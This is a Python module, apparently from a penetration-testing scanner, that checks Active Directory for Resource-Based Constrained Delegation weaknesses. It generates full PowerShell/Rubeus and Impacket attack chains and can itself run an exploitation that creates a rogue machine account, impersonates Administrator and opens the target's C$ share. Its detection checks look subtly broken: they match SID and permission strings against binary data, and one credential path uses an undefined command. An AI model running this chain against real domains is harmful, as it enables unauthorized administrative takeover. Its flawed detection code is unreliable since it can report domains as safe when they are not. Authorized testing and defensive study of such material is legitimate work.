"""
RBCD Checker Module

Checks for presence and possibility of exploiting Resource-Based Constrained Delegation (RBCD)
"""

import os
import re
import base64
import tempfile
import time
import random
import string
import shutil
from typing import Dict, Any
from ...proto import ScanOptions, DirectoryType
from ..core.directory_detector import DirectoryDetector
from ..enumeration.computer_enumerator import ComputerEnumerator
from utils.async_subprocess import run_exec


class RBCDChecker:
    """Checks for RBCD vulnerabilities"""
    
    def __init__(self, plugin_instance):
        self.plugin = plugin_instance
        self.directory_detector = DirectoryDetector(plugin_instance)
        self.computer_enumerator = ComputerEnumerator(plugin_instance)
    
    async def check_rbcd(self, scan_options: ScanOptions, target_computer: str = None,
                        perform_exploitation: bool = False) -> Dict[str, Any]:
        """
        Checks for presence and possibility of exploiting Resource-Based Constrained Delegation (RBCD)
        
        Args:
            scan_options: Scan parameters
            target_computer: Target computer for checking exploitation (optional)
            perform_exploitation: Execute exploitation attempt (False by default)
            
        Returns:
            Dict[str, Any]: Results checking RBCD
        """
        result = {
            "success": False,
            "vulnerable_objects": [],
            "rbcd_relationships": [],
            "write_permissions": [],
            "exploitation_test": None,
            "statistics": {
                "total_objects_checked": 0,
                "vulnerable_objects": 0,
                "suspicious_delegations": 0,
                "execution_time": 0
            },
            "errors": [],
            "exploitation_commands": {},
            "mitigation": []
        }
        
        start_time = time.time()
        
        if not scan_options.domain_name:
            result["errors"].append("Domain name not specified")
            return result
        
        if not (scan_options.username and (scan_options.password or scan_options.ntlm_hash)):
            result["errors"].append("Credentials not specified")
            return result
        
        try:
            directory_type = await self.directory_detector.determine_type(scan_options)
            
            if directory_type != DirectoryType.ACTIVE_DIRECTORY:
                result["errors"].append("Checking RBCD supported only for Active directory")
                return result
            
            domain_parts = scan_options.domain_name.split('.')
            base_dn = f"DC={',DC='.join(domain_parts)}"
            
            ldap_server = scan_options.ldap_server
            
            if ldap_server is None and scan_options.use_domain_discovery:
                try:
                    rc, out, _ = await run_exec(
                        ["dig", "+short", f"_ldap._tcp.{scan_options.domain_name}", "SRV"],
                        timeout=10,
                    )
                    
                    if rc == 0 and (out or "").strip():
                        line = (out or "").strip().splitlines()[0]
                        parts = line.strip().split()
                        ldap_server = parts[-1][:-1]
                except Exception:
                    pass
            
            if not ldap_server:
                result["errors"].append("Not specified LDAP server and automatic detection failed")
                return result
            
            # Step 1: Finding all objects with attribute msDS-AllowedToActOnBehalfOfOtherIdentity
            ldapsearch_cmd = [
                'ldapsearch', '-x', '-H', f'ldap://{ldap_server}',
                '-b', base_dn,
                '(msDS-AllowedToActOnBehalfOfOtherIdentity=*)',
                'sAMAccountName', 'distinguishedName', 'dNSHostName',
                'msDS-AllowedToActOnBehalfOfOtherIdentity', 'objectSid'
            ]
            
            if scan_options.username and scan_options.password:
                ldapsearch_cmd.extend(['-D', scan_options.username, '-w', scan_options.password])
            elif scan_options.username and scan_options.ntlm_hash:
                ldapsearch_cmd.extend(['-D', scan_options.username, '--ntlm', '-w', scan_options.ntlm_hash])
            
            rc, out, err = await run_exec(ldapsearch_cmd, timeout=60)
            
            if rc == 0:
                entries = (out or "").split("\n\n")
                rbcd_objects = []
                
                for entry in entries:
                    if not entry.strip():
                        continue
                    
                    try:
                        dn_match = re.search(r'dn:\s*(.*?)$', entry, re.MULTILINE)
                        sam_match = re.search(r'sAMAccountName:\s*(.*?)$', entry, re.MULTILINE)
                        dns_match = re.search(r'dNSHostName:\s*(.*?)$', entry, re.MULTILINE)
                        rbcd_data_match = re.search(
                            r'msDS-AllowedToActOnBehalfOfOtherIdentity::\s*(.*?)(?:\n\n|\n [^\s]|$)',
                            entry, re.DOTALL
                        )
                        
                        if dn_match and rbcd_data_match:
                            distinguished_name = dn_match.group(1).strip()
                            sam_account_name = sam_match.group(1).strip() if sam_match else None
                            dns_hostname = dns_match.group(1).strip() if dns_match else None
                            
                            rbcd_data_b64 = rbcd_data_match.group(1).replace("\n ", "")
                            rbcd_binary = base64.b64decode(rbcd_data_b64)
                            
                            suspicious_sids = [
                                "S-1-5-21-",
                                "S-1-5-32-545",
                                "S-1-5-11",
                                "S-1-1-0",
                                "S-1-5-7"
                            ]
                            
                            rbcd_data_str = str(rbcd_binary)
                            is_suspicious = False
                            matched_sid = None
                            
                            for sid in suspicious_sids:
                                if sid in rbcd_data_str:
                                    is_suspicious = True
                                    matched_sid = sid
                                    break
                            
                            rbcd_object = {
                                "distinguished_name": distinguished_name,
                                "sam_account_name": sam_account_name,
                                "dns_hostname": dns_hostname,
                                "has_rbcd": True,
                                "is_suspicious": is_suspicious,
                                "matched_sid": matched_sid
                            }
                            
                            rbcd_objects.append(rbcd_object)
                            
                            if is_suspicious:
                                result["vulnerable_objects"].append(rbcd_object)
                    except Exception as e:
                        result["errors"].append(f"Error during processing object with RBCD: {str(e)}")
                
                result["rbcd_relationships"] = rbcd_objects
                result["statistics"]["total_objects_checked"] = len(entries)
                result["statistics"]["suspicious_delegations"] = len(result["vulnerable_objects"])
            else:
                result["errors"].append(f"Error during request for RBCD objects: {err}")
            
            # Step 2: Finding computers, for which current user can modify msDS-AllowedToActOnBehalfOfOtherIdentity
            computers = await self.computer_enumerator.enumerate(scan_options, directory_type)
            computers_with_write_permissions = []
            
            for computer in computers:
                try:
                    ldapsearch_cmd = [
                        'ldapsearch', '-x', '-H', f'ldap://{ldap_server}',
                        '-b', computer.distinguished_name,
                        '-s', 'base',
                        '(objectClass=*)',
                        'nTSecurityDescriptor'
                    ]
                    
                    if scan_options.username and scan_options.password:
                        ldapsearch_cmd.extend(['-D', scan_options.username, '-w', scan_options.password])
                    elif scan_options.username and scan_options.ntlm_hash:
                        ldapsearch_cmd.extend(['-D', scan_options.username, '--ntlm', '-w', scan_options.ntlm_hash])
                    
                    rc, out, _ = await run_exec(ldapsearch_cmd, timeout=30)
                    
                    if rc == 0:
                        can_write = False
                        
                        if "GenericWrite" in (out or "") and scan_options.username in (out or ""):
                            can_write = True
                        elif "WriteProperty" in (out or "") and scan_options.username in (out or ""):
                            can_write = True
                        
                        if can_write:
                            computers_with_write_permissions.append({
                                "distinguished_name": computer.distinguished_name,
                                "sam_account_name": computer.sam_account_name,
                                "dns_hostname": computer.dns_hostname,
                                "is_domain_controller": computer.is_domain_controller,
                                "vulnerable_to_rbcd": True
                            })
                except Exception as e:
                    result["errors"].append(f"Error while checking ACL computer {computer.name}: {str(e)}")
            
            result["write_permissions"] = computers_with_write_permissions
            result["statistics"]["vulnerable_objects"] = len(computers_with_write_permissions)
            
            # Step 3: Creating commands for exploitation
            if computers_with_write_permissions:
                target_computer_obj = computers_with_write_permissions[0]
                
                powershell_cmd = f"""
    # RBCD exploitation using PowerShell
    # This script demonstrates, how can exploit RBCD

    # 1. First need to create new computer account (if you have rights)
    $ComputerName = "EvilComputer"
    $Computer = New-MachineAccount -MachineAccount $ComputerName -Password $(ConvertTo-SecureString 'P@ssw0rd123' -AsPlainText -Force) -Domain {scan_options.domain_name} -DomainController {ldap_server} -Verbose

    # 2. Getting SID created computer
    $ComputerSid = Get-DomainComputer -Identity $ComputerName | Select-Object -ExpandProperty objectsid

    # 3. Creating raw SD with our computer
    $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
    $SDBytes = New-Object byte[] ($SD.BinaryLength)
    $SD.GetBinaryForm($SDBytes, 0)

    # 4. Adding our computer In msDS-AllowedToActOnBehalfOfOtherIdentity target computer
    Get-DomainComputer "{target_computer_obj['sam_account_name'].replace('$', '')}" | Set-DomainObject -Set @{{'msDS-AllowedToActOnBehalfOfOtherIdentity'=$SDBytes}}

    # 5. Getting TGT for created computer
    Rubeus.exe asktgt /user:$ComputerName$ /password:P@ssw0rd123 /domain:{scan_options.domain_name} /dc:{ldap_server} /nowrap

    # 6. Using S4U2Self for obtaining service ticket on behalf of administrator
    Rubeus.exe s4u /ticket:doIFNj....[TGT_from_step_5] /impersonateuser:Administrator /msdsspn:CIFS/{target_computer_obj['dns_hostname']} /dc:{ldap_server} /ptt
    """
                
                impacket_cmd = f"""
    # RBCD exploitation using Impacket

    # 1. Creating computer account
    addcomputer.py -computer-name 'EvilComputer$' -computer-pass 'P@ssw0rd123' {scan_options.domain_name}/{scan_options.username}:{scan_options.password or "PASSWORD"} -dc-ip {ldap_server}

    # 2. Configuring RBCD
    rbcd.py -delegate-from 'EvilComputer$' -delegate-to "{target_computer_obj['sam_account_name']}" -action write {scan_options.domain_name}/{scan_options.username}:{scan_options.password or "PASSWORD"} -dc-ip {ldap_server}

    # 3. Requesting ticket using S4U2Proxy
    getST.py -spn "CIFS/{target_computer_obj['dns_hostname']}" -impersonate Administrator -dc-ip {ldap_server} {scan_options.domain_name}/EvilComputer$:P@ssw0rd123
    """
                
                result["exploitation_commands"]["powershell"] = powershell_cmd
                result["exploitation_commands"]["impacket"] = impacket_cmd
            
            # Step 4: Executing PoC exploitation, if requested
            if perform_exploitation and target_computer:
                try:
                    temp_dir = tempfile.mkdtemp()
                    evil_computer_name = f"RBCD{random.randint(10000, 99999)}"
                    evil_computer_password = ''.join(random.choices(string.ascii_letters + string.digits, k=12))
                    
                    if scan_options.password:
                        addcomputer_cmd = [
                            'addcomputer.py',
                            f"{scan_options.domain_name}/{scan_options.username}:{scan_options.password}",
                            '-computer-name', f"{evil_computer_name}$",
                            '-computer-pass', evil_computer_password,
                            '-dc-ip', ldap_server
                        ]
                    elif scan_options.ntlm_hash:
                        addcomputer_cmd = [
                            'addcomputer.py',
                            f"{scan_options.domain_name}/{scan_options.username}",
                            '-hashes', f":{scan_options.ntlm_hash}",
                            '-computer-name', f"{evil_computer_name}$",
                            '-computer-pass', evil_computer_password,
                            '-dc-ip', ldap_server
                        ]
                    else:
                        raise ValueError("Password or NTLM Hash required for exploitation")
                    
                    addcomputer_rc, _, addcomputer_err = await run_exec(addcomputer_cmd, timeout=120)
                    
                    if addcomputer_rc != 0:
                        raise Exception(f"Error creating computer: {addcomputer_err}")
                    
                    ldapsearch_cmd = [
                        'ldapsearch', '-x', '-H', f'ldap://{ldap_server}',
                        '-b', base_dn,
                        f'(sAMAccountName={evil_computer_name}$)',
                        'objectSid'
                    ]
                    
                    if scan_options.username and scan_options.password:
                        ldapsearch_cmd.extend(['-D', scan_options.username, '-w', scan_options.password])
                    elif scan_options.username and scan_options.ntlm_hash:
                        ldapsearch_cmd.extend(['-D', scan_options.username, '--ntlm', '-w', scan_options.ntlm_hash])
                    
                    sid_rc, sid_out, sid_err = await run_exec(ldapsearch_cmd, timeout=30)
                    
                    if sid_rc != 0:
                        raise Exception(f"Error obtaining SID: {sid_err}")
                    
                    sid_match = re.search(r'objectSid::\s*([A-Za-z0-9+/=]+)', sid_out or "")
                    if not sid_match:
                        raise Exception("SID not found in LDAP response")
                    
                    if scan_options.password:
                        rbcd_cmd = [
                            'rbcd.py',
                            f"{scan_options.domain_name}/{scan_options.username}:{scan_options.password}",
                            '-delegate-from', f"{evil_computer_name}$",
                            '-delegate-to', target_computer,
                            '-action', 'write',
                            '-dc-ip', ldap_server
                        ]
                    elif scan_options.ntlm_hash:
                        rbcd_cmd = [
                            'rbcd.py',
                            f"{scan_options.domain_name}/{scan_options.username}",
                            '-hashes', f":{scan_options.ntlm_hash}",
                            '-delegate-from', f"{evil_computer_name}$",
                            '-delegate-to', target_computer,
                            '-action', 'write',
                            '-dc-ip', ldap_server
                        ]
                    
                    rbcd_rc, _, rbcd_err = await run_exec(rbcd_cmd, timeout=120)
                    
                    if rbcd_rc != 0:
                        raise Exception(f"Error during RBCD configuration: {rbcd_err}")
                    
                    if scan_options.password:
                        gettgt_cmd = [
                            'getTGT.py',
                            f"{scan_options.domain_name}/{evil_computer_name}$:{evil_computer_password}",
                            '-dc-ip', ldap_server,
                            '-outfile', f"{temp_dir}/tgt.ccache"
                        ]
                    
                    gettgt_rc, _, gettgt_err = await run_exec(gettgt_cmd, timeout=120)
                    
                    if gettgt_rc != 0:
                        raise Exception(f"Error during retrieval TGT: {gettgt_err}")
                    
                    getst_cmd = [
                        'getST.py',
                        f"{scan_options.domain_name}/{evil_computer_name}$:{evil_computer_password}",
                        '-spn', f"CIFS/{target_computer}",
                        '-impersonate', "Administrator",
                        '-dc-ip', ldap_server,
                        '-k', '-no-pass',
                        '-outfile', f"{temp_dir}/admin.ccache"
                    ]
                    
                    env_tgt = {**os.environ, "KRB5CCNAME": f"{temp_dir}/tgt.ccache"}
                    getst_rc, _, getst_err = await run_exec(getst_cmd, env=env_tgt, timeout=180)
                    
                    if getst_rc != 0:
                        raise Exception(f"Error during S4U2Proxy: {getst_err}")
                    
                    env_admin = {**os.environ, "KRB5CCNAME": f"{temp_dir}/admin.ccache"}
                    smbclient_cmd = [
                        'smbclient',
                        f"//{target_computer}/C$",
                        '-k', '-no-pass',
                        '-c', 'ls'
                    ]
                    
                    smb_rc, smb_out, smb_err = await run_exec(smbclient_cmd, env=env_admin, timeout=30)
                    access_success = smb_rc == 0
                    
                    result["exploitation_test"] = {
                        "target_computer": target_computer,
                        "evil_computer": f"{evil_computer_name}$",
                        "successfully_created_computer": True,
                        "successfully_configured_rbcd": rbcd_rc == 0,
                        "successfully_obtained_ticket": getst_rc == 0,
                        "access_granted": access_success,
                        "output": smb_out if access_success else smb_err
                    }
                    
                    cleanup_rbcd_cmd = [
                        'rbcd.py',
                        f"{scan_options.domain_name}/{scan_options.username}:{scan_options.password or ''}",
                        '-delegate-from', f"{evil_computer_name}$",
                        '-delegate-to', target_computer,
                        '-action', 'remove',
                        '-dc-ip', ldap_server
                    ]
                    
                    if scan_options.ntlm_hash:
                        cleanup_rbcd_cmd = [
                            'rbcd.py',
                            f"{scan_options.domain_name}/{scan_options.username}",
                            '-hashes', f":{scan_options.ntlm_hash}",
                            '-delegate-from', f"{evil_computer_name}$",
                            '-delegate-to', target_computer,
                            '-action', 'remove',
                            '-dc-ip', ldap_server
                        ]
                    
                    await run_exec(cleanup_rbcd_cmd, timeout=120)
                    
                    delcomputer_cmd = [
                        'addcomputer.py',
                        f"{scan_options.domain_name}/{scan_options.username}:{scan_options.password or ''}",
                        '-computer-name', f"{evil_computer_name}$",
                        '-delete',
                        '-dc-ip', ldap_server
                    ]
                    
                    if scan_options.ntlm_hash:
                        delcomputer_cmd = [
                            'addcomputer.py',
                            f"{scan_options.domain_name}/{scan_options.username}",
                            '-hashes', f":{scan_options.ntlm_hash}",
                            '-computer-name', f"{evil_computer_name}$",
                            '-delete',
                            '-dc-ip', ldap_server
                        ]
                    
                    await run_exec(delcomputer_cmd, timeout=120)
                    shutil.rmtree(temp_dir, ignore_errors=True)
                
                except Exception as e:
                    result["errors"].append(f"Error during exploitation RBCD: {str(e)}")
                    try:
                        if 'temp_dir' in locals():
                            shutil.rmtree(temp_dir, ignore_errors=True)
                    except Exception:
                        pass
            
            result["mitigation"] = [
                "Regularly check attribute msDS-AllowedToActOnBehalfOfOtherIdentity on all computers",
                "Monitor rights for changing this attribute - restrict possibility of entry",
                "Monitor creation of new computer accounts",
                "Use Protected Users group for critical accounts",
                "Enable Protected authentication (EPA) for blocking delegation for privileged accounts",
                "Monitor events Windows Security Event ID 4624 (login to system) and Kerberos TGS requests (Event ID 4769) with option 'This request was a resource-based constrained delegation'"
            ]
            
            result["success"] = True
        
        except Exception as e:
            result["errors"].append(f"General error: {str(e)}")
        
        result["statistics"]["execution_time"] = time.time() - start_time
        
        return result

